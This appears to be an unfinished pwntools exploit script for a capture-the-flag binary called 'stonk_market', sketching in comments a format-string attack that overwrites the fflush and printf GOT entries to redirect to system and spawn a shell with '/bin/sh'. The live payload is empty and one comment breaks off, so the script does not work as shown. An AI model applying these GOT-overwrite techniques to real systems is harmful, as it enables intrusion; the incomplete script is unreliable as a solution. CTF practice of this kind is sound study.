from pwn import *
e = ELF('./stonk_market')
r = process('./stonk_market')
context(arch='amd64', os='linux')
#gdb.attach(r, 'break buy_stonks')
#print({e.got['fflush']: e.symbols['buy_stonks']})
#print(p64(e.symbols['buy_stonks']), p64(e.plt['system']), p64(e.got['fflush']), p64(e.got['printf']))
#payload = fmtstr_payload(5, {e.got['fflush']: e.symbols['buy_stonks'], e.got['printf']: e.plt['system']})
# %12$n for main rbp writes
# 1. write 
payload = b''
print('payload ', payload)
r.sendline(b'1')
r.sendline(payload)
r.sendline(b'/bin/sh')
r.interactive()

